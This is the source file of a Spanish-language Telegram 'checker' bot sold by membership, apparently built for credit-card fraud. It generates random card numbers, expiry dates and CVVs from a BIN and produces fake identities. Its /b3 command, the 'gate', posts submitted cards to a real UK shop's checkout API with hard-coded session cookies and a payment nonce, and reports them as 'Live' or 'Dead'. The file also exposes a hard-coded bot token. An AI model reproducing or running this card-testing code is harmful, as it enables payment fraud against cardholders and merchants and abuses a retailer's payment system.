from configs import *
import telebot
import time
import threading
from telebot.types import (
InlineKeyboardMarkup,
InlineKeyboardButton,
ReplyKeyboardMarkup,
ReplyKeyboardRemove
)
import csv
import logging
import os
import re
import imaplib
import random
from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup
import requests
import youtube_dl
from telebot import TeleBot
#### importe del toke ###
from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup
TOKEN = '5929981615:AAELjumCNMn2E-8-7lyz8WaG1eAH2CUMWQo'
bot = telebot.TeleBot(TOKEN)



############# claim #########
@bot.message_handler(commands=['claim_pb'])
def claim_pb_command(message):
    user_id = message.from_user.id
    key = message.text.split()[1]

    
    if key in open('keys_pb.txt').read():

        with open('users.txt', 'a') as f:
            f.write(f'{user_id} PREMIUM\n')
        bot.send_message(message.chat.id, 'Clave válida, has obtenido PREMIUM')
    else:
        bot.send_message(message.chat.id, 'Clave inválida')


##################### no autorizado #################
def is_authorized(user_id):
    with open('users.txt', 'r') as f:
        for line in f:
            if str(user_id) in line:
                return True
    return False

@bot.message_handler(func=lambda message: not is_authorized(message.from_user.id))
def unauthorized(message):
    bot.send_message(message.chat.id, 'Lo ciento pero no estas autorizado para usar este bot, para obtener una membresia contacta a mi creador @tva_xzz')

############## 💣 AÑADÍR USUARIOS AL USERS 💣 #######$##

############## 💣 AÑADÍR USUARIOS AL USERS 💣 #######$##

@bot.message_handler(commands=['add'])
def add_content(message):
    if message.chat.id != 5019536742:  # Reemplaza ID_DUEÑO por el ID del dueño
        bot.send_message(message.chat.id, 'Lo siento, no tienes permiso para usar este comando.')
        return
    id_us = message.text.split
    seller = "<a href='https://t.me/TVA_XZZ'>T V A</a>"
    words = message.text.split()[1:]
    id = words[1]
    content = message.text.split()[1:]
    content = ' '.join(content)
    with open('users.txt', 'a') as f:
        f.write(content + '\n')
    bot.send_message(message.chat.id, '<b>━━━━━━ ϟNFO ━━━━━━\n<u>- USER ID: </u><code>{}</code>\n<u>- RANGO: </u><code>PREMIUM</code>\n<u>- SELLER:</u> <code>{}</code>\n━━━━━━ GHOST ━━━━━\nBOT BY {}</b>'.format(id_us, seller, seller), parse_mode="html", disable_web_page_preview=True)



###########🤓obtener información de usuario #########

@bot.message_handler(commands=['me'])
def get_user_info(message):
    user = message.from_user
    chat_id = message.chat.id

    # Comprueba si el mensaje es de un chat privado
    if message.chat.type != "private":
        # Si no es de un chat privado, envía un mensaje de error y devuelve chat_id con error
        bot.reply_to(message, "Este comando solo funciona en chats privados")
        chat_id = "error"
    else:
        # Si es de un chat grupal, envía la información del usuario
        bot.reply_to(message, f"<b><u>- User Name:</u> <code>{user.username}</code>\n<u>- User ID:</u><code> {user.id}</code>\n<u>- Alias: </u><code>{user.first_name}</code>\n<u>- Chat ID: </u><code>{chat_id}</code></b>", parse_mode="html")


button1 = InlineKeyboardButton(text="🔥TOOLS🔥", callback_data="tools")
button2 = InlineKeyboardButton(text="🔥GATE🔥", callback_data="gate")
keyboard_inline = InlineKeyboardMarkup().add(button1, button2,)

#telegram comandos
@bot.message_handler(commands=["start"])
def registrar_usuario(message):
    remove = ReplyKeyboardRemove()
    bot.reply_to(message, "<b>[#𝐂𝐑𝐄𝐂K𝐄𝐑𝐒 ⛄️] \n\n[*] >> ESTE BOT FUE DISEÑADO EN  <u>PYTHON</u> POR <a href='@TVA_XZZ'>@TVA_XZZ</a>\n[*] >> ACTUALIZACIONES DIARIAS FULL...</b>", parse_mode="html", disable_web_page_preview=False, reply_markup=keyboard_inline)
    user_id = str(message.from_user.id)
    with open('users.txt', 'r') as f:
        for line in f:
            if user_id in line:
                
                return True
    with open('users.txt', 'a') as f:
        f.write(username + '\n')
    print(message.chat.id)

  #################  CONTACTO ADMIN ##############
@bot.message_handler(commands=["dev"])

def boton(message):
   owner = InlineKeyboardMarkup(row_width = 2)
   own = InlineKeyboardButton("OWNER", url="https://t.me/TVA_XZZ")
   owner.add(own)
   bot.send_message(message.chat.id, "<b>Hola Este Es el Contacto De mi Creador\nPara Cualquier Duda O Pregunta o Alguna Situación o Bug</b>",reply_markup=owner, parse_mode="html")


############ obtner información de chat 🪙🪙############
@bot.message_handler(commands=['chat'])
def get_user_info(message):
        user = message.from_user
        chat_id = message.chat.id
        # Si es de un chat grupal, envía la información del usuario y id del chat
        bot.reply_to(message, f"<b><u>- User Name:</u> <code>{user.username}</code>\n<u>- User ID:</u><code> {user.id}</code>\n<u>- Alias: </u><code>{user.first_name}</code>\n<u>- Chat ID: </u><code>{chat_id}</code></b>", parse_mode="html")

#################### RANDOM ADDRESS #####################



import json


def generate_random_user(country_code):
    url = f"https://randomuser.me/api/1.2/?nat={country_code}"
    response = requests.get(url)
    if response.status_code == 200:
     data = json.loads(response.text)
     user = data["results"][0]
     return f"<b>\n━━━━━━━ ADDRESS ━━━━━━\n<u>- Nombre:</u> <code>{user['name']['first']} {user['name']['last']}</code>\n<u>- Genero: </u><code>{user['gender']}\n</code><u>- Calle:</u> <code>{user['location']['street']}</code>\n<u>- Telefono:</u> <code>+1 {user['phone']}</code>\n<u>- Pais: </u><code>{user['nat']}</code><u>\n- Correo:</u> <code>{user['email']}</code></b>"
     
  
    else:
       return "Ha ocurrido un error al obtener los datos del usuario aleatorio. Por favor, inténtalo de nuevo más tarde."

@bot.message_handler(commands=['rand'])
def send_random_user(message):
    ipp = ".".join([str(random.randint(0, 255)) for _ in range(4)])

    # Obtener información de la IP
    r = requests.get(f"https://ipapi.co/{ipp}/json/")
    respuesta = r.json()
    pais = respuesta.get("country")
    ciudad = respuesta.get("city")
    proveedor = respuesta.get("isp")
    ip = respuesta.get("query")
    regioname = respuesta.get("regionName")
    zip = respuesta.get("zip")
    org = respuesta.get("org")


  # Crea un mensaje con la información obtenida
    ip_inf = f"<b>\n<u>>> IP </u>: <code>{ipp}</code>\n<u>>> Ciudad </u>: <code>{ciudad}</code>\n<u>>> ISP </u>: <code>{proveedor}</code>\n<u>>> Región </u>: <code>{regioname}</code>\n<u>>> ZIP </u>: <code>{zip}</code>\n<u>>> Organización</u> : <code>{org}</code>\n━━━━━━━━ ϟNFO ━━━━━━━\n<u>BOT BY @TVA_XZZ</u></b>"


    if len(message.text.split()) > 1:
     country_code = message.text.split()[1]
     user_data = generate_random_user(country_code)
     bot.send_message(message.chat.id, user_data + ip_inf, parse_mode="html")
    else:
       bot.reply_to(message, "<b>❗FORMATO INCORRECTO ❗\n\n- Ejemplo: rand US  LA  MA  ZA ETC..... ")
       


                            

def busqueda(bin, currency, username):
  status = requests.get("https://lookup.binlist.net/"+str(bin), params={"currency": currency})
  if status.status_code == 404:
    return False
  else:
    data = status.json()
    lista = []
    try:
      lista.append(bin)
      lista.append(data["brand"]) #marca
    except (KeyError, TypeError):
      lista.append(None)
    try:
      lista.append(data["bank"]["name"]) #banco y marca
    except (KeyError, TypeError):
      lista.append(None)
    try:
      lista.append(data["scheme"]) #provedor
    except (KeyError, TypeError):
      lista.append(None)
    try:
      lista.append(data["type"]) #debito o crédito 
    except (KeyError, TypeError):
      lista.append(None)
    try:
      lista.append(data["country"]["name"]) 
    except (KeyError, TypeError):
      lista.append(None)
    try:
      lista.append(data["country"]["emoji"])
    except (KeyError, TypeError):
      lista.append(None)
    lista.append(currency)
    return [True, lista, username]

@bot.message_handler(commands=['c3'])
def verificar_bin(message):
    card = message.text.split()[1]
    bin1 = card[:6]
    query = message.text.split()[1]
    currency = message.text.split()[2] if len(message.text.split()) > 2 else ""


    bin = message.text.split()[1]
    url = "https://lookup.binlist.net/"+str(bin)
    respuesta = requests.get(url)
    datos_bin = respuesta.json()

    tiene_3d_secure = datos_bin.get("threeD_secure")
    
    results = busqueda(query, currency, message.from_user.username)
    if not results:
      bot.send_message(message.chat.id, "No se encontraron resultados para el número de bin proporcionado.")
      return
    final = "<b>BIN⇨<code>{}</code>\nCHK⇨<code>{}</code>\nBANK⇨<code>{}</code>\nPAIS⇨<code>{} {}</code>\nTYPE⇨<code>{} </code>\nPAIS⇨<code>{} {}</code>\n━━━━━━━━━━ DEV ━━━━━━━━━\n<u>BOT BY <a href='https://t.me/TVA_XZZ'>T V A</a></u></b>".format(bin1, *results[1])
    # Obtener el BIN del mensaje
    card = message.text.split()[1]
    bin6 = card[:6]
    

    if tiene_3d_secure:
        bot.reply_to(message, "<b>\n┅┅┅┅┅┅┅┅ CARD ┅┅┅┅┅┅┅┅┅\nCard →<code>{}</code>\nStatus →DECLINED ❌\nResponse →[lookup_enrolled] ✅\n{}</b>" + final, parse_mode="html", disable_web_page_preview=True)
       
    else:
        bot.reply_to(message, "<b>\n┅┅┅┅┅┅┅┅ CARD ┅┅┅┅┅┅┅┅┅\nCard →<code><u>{}</u></code>\nStatus →APPROVED ✅\nResponse →[lookup_not_enrolled] ✅\n━━━━━━━━━ ϟNFO ━━━━━━━━━\n</b>".format(card) + final, disable_web_page_preview=True, parse_mode="html")
   
                            
                                                  
########## gen #########################################


def generar_cc(bin, cantidad, username):

  list_meses = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"]
  contador = 0
  lista_ccs = []
  # Reemplazando los datos

  while contador < cantidad:
  # Clasificando datos
    datos_cc = bin.split("|")
    if len(datos_cc) == 1:
      while len(datos_cc[0]) < 16:
        datos_cc[0] = datos_cc[0]+"x"
      datos_cc.append("rnd")
      datos_cc.append("rnd")
      datos_cc.append("rnd")
    # Haciendo un control de flujo
    if datos_cc[1] == "rnd":
      datos_cc[1] = "xx"
    if datos_cc[2] == "rnd":
      datos_cc[2] = "xxxx"
    if datos_cc[3] == "rnd":
      datos_cc[3] = "xxx"
    if "xx" in datos_cc:
      datos_cc[1] = str(random.choice(list_meses))
    if "xxx" in datos_cc:
      datos_cc[3] = str(random.randint(100, 999))
    if "xxxx" in datos_cc:
      datos_cc[2] = str(random.randint(2023, 2030))
    cc_bin = ""
    contador = contador+1
    for digitos in datos_cc[0]:
      if digitos == "x":
        digitos = random.randint(0, 9)
        cc_bin = cc_bin+str(digitos)
      else:
        cc_bin = cc_bin+str(digitos)
      datos_cc[0] = str(cc_bin)
    lista_ccs.append(datos_cc)
  return lista_ccs
  
@bot.message_handler(commands=['gen'])
def gen(message):
    # Separar componentes del bin
    bin = message.text.split()[1]
    bin_f = bin.split("|")[0]
    mes_f = bin.split("|")[1]
    # Generar tarjetas de crédito
    resultados = generar_cc(bin_f, 10, "a")
    mensaje = "<b>━━━━━━━━ CCS ━━━━━━━━</b>\n"
    for datos in resultados:
        mensaje = mensaje + "<code>" + "|".join(datos) + "</code>" + "\n" 
    query = message.text.split()[1]
    currency = message.text.split()[2] if len(message.text.split()) > 2 else "USD"

    # Realiza la búsqueda y obtén los resultados
    results = busqueda(query, currency, message.from_user.username)
    if not results:
      bot.send_message(message.chat.id, "No se encontraron resultados para el número de bin proporcionado.")
      return

    owner = InlineKeyboardMarkup(row_width = 2)
    own = InlineKeyboardButton("OWNER", url="https://t.me/TVA_XZZ")
    owner.add(own)

    # Crear un mensaje con los resultados
    final = "<b>━━━━━━━━ BϟN ━━━━━━━━\nBIN⇨<code>{}</code>\nBANCO⇨<code>{} {} </code>\nTIPO⇨<code>{}{}</code>\nPAIS⇨<code>{} {}</code>\nDIVISA⇨<code>{}</code>\n━━━━━━━━ ϟNFO ━━━━━━━\n<u>BOT BY  @TVA_XZZ</u></b>".format(*results[1])
    bot.send_message(message.chat.id, mensaje + final, parse_mode="html")

#############################I P ###################################

########## información de una ip #############


# Función para procesar la respuesta de la API de ip-api.com
def procesar_respuesta(respuesta):
  # La respuesta es un diccionario JSON con varias claves
  # Puedes acceder a cada clave como elemento de diccionario
  pais = respuesta["country"]
  ciudad = respuesta["city"]
  proveedor = respuesta["isp"]
  ip = respuesta["query"]
  estatus = respuesta["status"]
  regioname = respuesta["regionName"]
  zip = respuesta["zip"]
  lati = respuesta["lat"]
  lon = respuesta["lon"]
  org = respuesta["org"]


  # Crea un mensaje con la información obtenida
  mensaje = f"<b>\n<u>>> IP </u>: <code>{ip}</code>\n<u>>> Estado </u>: <code>{estatus}</code>\n<u>>> Ciudad </u>: <code>{ciudad}</code>\n<u>>> ISP </u>: <code>{proveedor}</code>\n<u>>> Región </u>: <code>{regioname}</code>\n<u>>> ZIP </u>: <code>{zip}</code>\n<u>>> Latitud</u> : <code>{lati}</code>\n<u>>> Longitud</u> : <code>{lon}</code>\n<u>>> Organización</u> : <code>{org}</code>\n<u>>> Mobil </u>: <code>False</code>\n\n<u>BOT BY @TVA_XZZ</u></b>"
  return mensaje


# Manejador de mensajes para el bot
@bot.message_handler(func=lambda m: m.text.startswith(("/ip", "/IP", ".ip")))
def enviar_informacion(mensaje):
    # Obtén el texto del mensaje y elimina el comando "/ip"
    texto = mensaje.text[3:].strip()

    # Comprueba si el texto es una dirección IP
    es_ip = True
    try:
        # Convierte el texto a una lista de números
        octetos = list(map(int, texto.split(".")))
        # Comprueba si cada número está entre 0 y 255
        for octeto in octetos:
            if octeto < 0 or octeto > 255:
                es_ip = False
                break
    except ValueError:
        # Si ocurre un error al convertir el texto a una lista de números, entonces no es una dirección IP válida
        es_ip = False

    if es_ip:
        # Si el texto es una dirección IP, envía una solicitud a la API de ip-api.com
        url = f"http://ip-api.com/json/{texto}"
        respuesta = requests.get(url).json()

        # Procesa la respuesta y envía un mensaje con la información
        mensaje_procesado = procesar_respuesta(respuesta)
        bot.send_message(mensaje.chat.id, mensaje_procesado, parse_mode="html")
    else:
        # Si el texto no es una dirección IP, envía un mensaje de error
        bot.send_message(mensaje.chat.id, "<b>Lo siento, eso no parece ser una dirección IP válida.</b>", parse_mode="html")




################################################################
with open('owner.txt', 'r') as f:
    owner_ids = [int(line.strip()) for line in f]

@bot.message_handler(commands=['key_pb'])
def handle_key_pb(message):
    if message.from_user.id in owner_ids:
        content = message.text.split(' ', 1)[1]
        with open('keys_pb.txt', 'a') as f:
            f.write(content + '\n')
        bot.send_message(message.chat.id, "key creada con exito\n{}".format(content))
    else:
        bot.send_message(message.chat.id, "Lo siento, no tienes permiso para usar este comando")

#####################G A T E  B 3############################
@bot.message_handler(commands=['b3'])
def bin(message):
    ini = time.perf_counter()
    ccs = message.text[len('/b3 '):]

    if not ccs:
            bot.reply_to(message, "ESTA INGRESAANDO MAL LA CCS")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]

    nombre2 = "juan manuel santos"
    mail = "manueljaunsantos@gmail.com"
    
    cc1 = message.text[len("/b3 "): 11]
    bin = message.text[len("/b3 "): 11]
    gate = requests.get(f"https://bins-su-ani.vercel.app/api/{cc1}").json()

    result=gate['result']
    msg=gate['message']
    data=gate['data']
    vendor=data['vendor']
    bn=data['bin']
    typ=data['type']
    lv=data['level']
    bank=data['bank']
    country=data['country']
    countryinfo=data['countryInfo']
    name=countryinfo['name']
    emoji=countryinfo['emoji']
    cd=countryinfo['code']
    dialCode=countryinfo['dialCode']
    
    cookies = {
    'PHPSESSID': '1534367f77dcb6fa257734f121b0b206',
    'X-Magento-Vary': '006d13f9dba745eaec4e56a7a4a4cd4b961f6e24',
    'visid_incap_2134270': 'GjOND4avRWmKu4T+/GpkiPxtLmMAAAAAQUIPAAAAAAAFZO5GQ00CyIFSo2I4Hsgr',
    'nlbi_2134270': 'bQpQNYMjfgzWhZb0VKZh+QAAAACZuv2tVDvmyY4XNsUzDLt7',
    'incap_ses_7241_2134270': 'to0EYe2VogQ5B4vlYzN9ZP1tLmMAAAAAGNaUl8QEirpVOA/SbtNZ1w==',
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    'mage-cache-sessid': 'true',
    'form_key': 'zAgAtx5HDIkGruYC',
    'mage-banners-cache-storage': '%7B%7D',
    '_gcl_au': '1.1.1196544240.1663987214',
    '_gid': 'GA1.3.1874355780.1663987215',
    'mage-messages': '',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    'OptanonConsent': 'isIABGlobal=false&datestamp=Fri+Sep+23+2022+21%3A40%3A34+GMT-0500+(hora+de+verano+central)&version=6.10.0&hosts=&consentId=b5b1f13a-3756-40df-acae-dc416e82c18d&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CBG3%3A1%2CC0004%3A1%2CC0003%3A1%2CC0002%3A1&ingReconsent=false',
    '_ga': 'GA1.3.325045933.1663987215',
    'private_content_version': '2264f85822a743b6a242ef5f3aedd204',
    'section_data_ids': '%7B%22cart%22%3A1663987239%2C%22directory-data%22%3A1663987226%2C%22gtm%22%3A1663987392%2C%22wp_confirmation_popup%22%3A1663987226%2C%22messages%22%3A1663987718%7D',
    '_gat_UA-2252503-7': '1',
    '_gat_UA-235702982-1': '1',
    '_ga_Q9TTY54EFX': 'GS1.1.1663987215.1.1.1663988129.0.0.0',}
    
    headers = {
    'authority': 'www.waterpik.co.uk',
    'accept': '*/*',
    'accept-language': 'es-ES,es;q=0.9',
    # Already added when you pass json=
    # 'content-type': 'application/json',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'PHPSESSID=1534367f77dcb6fa257734f121b0b206; X-Magento-Vary=006d13f9dba745eaec4e56a7a4a4cd4b961f6e24; visid_incap_2134270=GjOND4avRWmKu4T+/GpkiPxtLmMAAAAAQUIPAAAAAAAFZO5GQ00CyIFSo2I4Hsgr; nlbi_2134270=bQpQNYMjfgzWhZb0VKZh+QAAAACZuv2tVDvmyY4XNsUzDLt7; incap_ses_7241_2134270=to0EYe2VogQ5B4vlYzN9ZP1tLmMAAAAAGNaUl8QEirpVOA/SbtNZ1w==; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=zAgAtx5HDIkGruYC; mage-banners-cache-storage=%7B%7D; _gcl_au=1.1.1196544240.1663987214; _gid=GA1.3.1874355780.1663987215; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; OptanonConsent=isIABGlobal=false&datestamp=Fri+Sep+23+2022+21%3A40%3A34+GMT-0500+(hora+de+verano+central)&version=6.10.0&hosts=&consentId=b5b1f13a-3756-40df-acae-dc416e82c18d&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CBG3%3A1%2CC0004%3A1%2CC0003%3A1%2CC0002%3A1&ingReconsent=false; _ga=GA1.3.325045933.1663987215; private_content_version=2264f85822a743b6a242ef5f3aedd204; section_data_ids=%7B%22cart%22%3A1663987239%2C%22directory-data%22%3A1663987226%2C%22gtm%22%3A1663987392%2C%22wp_confirmation_popup%22%3A1663987226%2C%22messages%22%3A1663987718%7D; _gat_UA-2252503-7=1; _gat_UA-235702982-1=1; _ga_Q9TTY54EFX=GS1.1.1663987215.1.1.1663988129.0.0.0',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMzODQyNDEiLCJhcCI6IjExMjAwNzAxMjkiLCJpZCI6ImQxZDY0ZTJhOWI2MjY4MTciLCJ0ciI6IjY2OTBlZWI4YzU4Zjg2Njk2NGQ4YzFhNjBmNDg2MjhjIiwidGkiOjE2NjM5ODgxMzE3NjYsInRrIjoiMTMyMjg0MCJ9fQ==',
    'origin': 'https://www.waterpik.co.uk',
    'referer': 'https://www.waterpik.co.uk/checkout/',
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-6690eeb8c58f866964d8c1a60f48628c-d1d64e2a9b626817-01',
    'tracestate': '1322840@nr=0-1-3384241-1120070129-d1d64e2a9b626817----1663988131766',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'x-newrelic-id': 'VwUPVVRXCRABVFVXAAcGUVYA',
    'x-requested-with': 'XMLHttpRequest',}
    
    json_data = {
    'cartId': 'jMCnkhMlVzbVyZqQO2fyygzuF49dzPnY',
    'billingAddress': {
        'countryId': 'GB',
        'region': 'ibague',
        'street': [
            'Ibague Sta Teresa Boqueron',
        ],
        'company': '',
        'telephone': '442045772900',
        'postcode': '730018',
        'city': 'Ibagué',
        'firstname': 'juan',
        'lastname': 'manuel',
        'saveInAddressBook': None,
    },
    'paymentMethod': {
        'method': 'braintree',
        'additional_data': {
            'payment_method_nonce': '7952b986-1289-1e6a-c9c8-901480fcc3d8',
            'device_data': '{"device_session_id":"c6016ed74b8f00a8ade15ab04c8fc3d1","fraud_merchant_id":null,"correlation_id":"31qwrbsWTAG6kdWNWiDg8uTu168u72imMB"}',
            'amgdpr_agreement': '{"privacy_checkbox":true}',
        },
    },
    'email': 'asdfcxjklz@hotmail.com',}
    
    response = requests.post('https://www.waterpik.co.uk/rest/waterpik_uk_site/V1/guest-carts/jMCnkhMlVzbVyZqQO2fyygzuF49dzPnY/payment-information', cookies=cookies, headers=headers, json=json_data).json()
    lol = response['message']
    
    final = time.perf_counter()
    if 'Your payment could not be taken. Please try again or use a different payment method. Cannot use a payment_method_nonce more than once. Merchant account does not support 3D Secure transactions for card type.' in lol:
         bot.reply_to(message, f"""

╔═══════════════════════╗                       
╟●✦CC➞ {ccs}
╟════════════════════════
╟●✦Estado➞ Dead! ❌
╟●✦Respuesta➞ {lol}
╟●✦CHARGED $1.00 
╟════════════════════════
╟●✦BIN➞ {bin}
╟●✦BANCO➞  {bank} - {vendor}
╟●✦TIPO➞ {typ} - {lv}
╟●✦PAÍS➞ {country} - {emoji}
╟●✦Tiempo➞ {final-ini:0.2}
╟════════════════════════
╟●✦Bot By➞ @TVA_XZZ
╚═══════════════════════╝
     """, parse_mode="html")


    else:
         bot.reply_to(message, f"""
╔═══════════════════════╗                       
╟●✦CC➞ {ccs}
╟════════════════════════
╟●✦Estado➞ 𝑨𝒑𝒑𝒓𝒐𝒗𝒆✅
╟●✦Respuesta➞ Live
╟●✦CHARGED $1.00 
╟════════════════════════
╟●✦BIN➞ {bin}
╟●✦BANCO➞  {bank} - {vendor}
╟●✦TIPO➞ {typ} - {lv}
╟●✦PAÍS➞ {country} - {emoji}
╟●✦Tiempo➞ {final-ini:0.2}
╟════════════════════════
╟●✦Bot By➞ @TVA_XZZ
╚═══════════════════════╝
   
        """)

  ################ bin info ##################

# Creando la funcion de buscar el bin
def busqueda(bin, currency, username):
  # Verificando la data
  status = requests.get("https://lookup.binlist.net/"+str(bin), params={"currency": currency})
  if status.status_code == 404:
    return False
  else:
    data = status.json()
    lista = []
    try:
      lista.append(bin)
      lista.append(data["brand"]) #marca
    except (KeyError, TypeError):
      lista.append(None)
    try:
      lista.append(data["bank"]["name"]) #banco y marca
    except (KeyError, TypeError):
      lista.append(None)
    try:
      lista.append(data["scheme"]) #provedor
    except (KeyError, TypeError):
      lista.append(None)
    try:
      lista.append(data["type"]) #debito o crédito 
    except (KeyError, TypeError):
      lista.append(None)
    try:
      lista.append(data["country"]["name"]) 
    except (KeyError, TypeError):
      lista.append(None)
    try:
      lista.append(data["country"]["emoji"])
    except (KeyError, TypeError):
      lista.append(None)
    lista.append(currency)
    return [True, lista, username]


@bot.message_handler(commands=['bin'])
def search(message):
    # Validando el formato del número de bin
    if len(message.text.split()[1]) != 6:
      bot.send_message(message.chat.id, "El número de bin debe tener 6 dígitos.")
      return
    try:
      int(message.text.split()[1])
    except ValueError:
      bot.send_message(message.chat.id, "El número de bin debe ser un número entero.")
      return

    # Obtén el argumento del comando de búsqueda y la moneda
    query = message.text.split()[1]
    currency = message.text.split()[2] if len(message.text.split()) > 2 else "USD"

    # Realiza la búsqueda y obtén los resultados
    results = busqueda(query, currency, message.from_user.username)
    if not results:
      bot.send_message(message.chat.id, "No se encontraron resultados para el número de bin proporcionado.")
      return

    owner = InlineKeyboardMarkup(row_width = 2)
    own = InlineKeyboardButton("OWNER", url="https://t.me/TVA_XZZ")
    owner.add(own)

    # Crear un mensaje con los resultados
    final = "<b>━━━━━━━━ BϟN ━━━━━━━━\nBIN⇨<code>{}</code>\nBANCO⇨<code>{} {} </code>\nTIPO⇨<code>{}{}</code>\nPAIS⇨<code>{} {}</code>\nDIVISA⇨<code>{}</code>\n━━━━━━━━ ϟNFO ━━━━━━━\n<u>BOT BY  @TVA_XZZ</u></b>".format(*results[1])

    bot.send_message(message.chat.id, final, reply_markup=owner, parse_mode="html")

############# comprobar nuevos mensajes ###########
def recibir_msg():
    bot.infinity_polling()

          ######## MAIN #########

if __name__ == '__main__':
    print('iniciando')
    hilo_bot = threading.Thread(name="hilo_bot", target=recibir_msg)
    hilo_bot.start()
    print('fin')
